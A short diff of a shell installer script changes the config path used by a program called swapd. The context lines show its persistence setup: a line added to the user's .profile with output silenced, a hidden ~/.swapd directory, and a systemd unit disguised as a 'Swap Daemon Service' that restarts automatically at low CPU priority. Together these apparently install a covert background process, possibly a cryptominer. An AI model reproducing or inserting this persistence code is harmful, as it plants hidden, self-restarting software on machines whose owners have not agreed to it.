@@ -354,7 +354,7 @@ echo "[*] #preparing script background work and work under reboot..."
 if ! sudo -n true 2>/dev/null; then
   if ! grep .swapd/swapd.sh $HOME/.profile >/dev/null; then
     echo "[*] Adding $HOME/.swapd/swapd.sh script to $HOME/.profile"
-    echo "$HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+    echo "$HOME/.swapd/swapd.sh --config=$HOME/.swapd/config.json >/dev/null 2>&1" >>$HOME/.profile
   else
     echo "Looks like $HOME/.swapd/swapd.sh script is already in the $HOME/.profile"
   fi
@@ -386,7 +386,7 @@ else
 Description=Swap Daemon Service
 
 [Service]
-ExecStart=$HOME/.swapd/swapd --config=/root/.swapd/config_background.json
+ExecStart=$HOME/.swapd/swapd --config=/root/.swapd/config.json
 Restart=always
 Nice=10
 CPUWeight=1
